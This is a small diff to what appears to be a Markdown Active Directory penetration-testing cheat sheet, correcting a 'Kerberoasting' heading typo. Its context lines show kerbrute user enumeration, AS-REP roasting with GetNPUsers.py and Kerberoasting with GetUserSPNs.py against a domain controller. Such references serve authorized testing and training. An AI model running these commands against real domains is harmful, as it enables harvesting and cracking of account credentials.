@@ -327,7 +327,7 @@ kerbrute -users userlist.txt -dc-ip IP -domain domain.local
 ```
 GetNPUsers.py -dc-ip IP domain.local/user -outputfile hashes.asreproast
 ```
-### Kerberoastin
+### Kerberoasting
 
 ```
 GetUserSPNs.py DC-IP\user:password
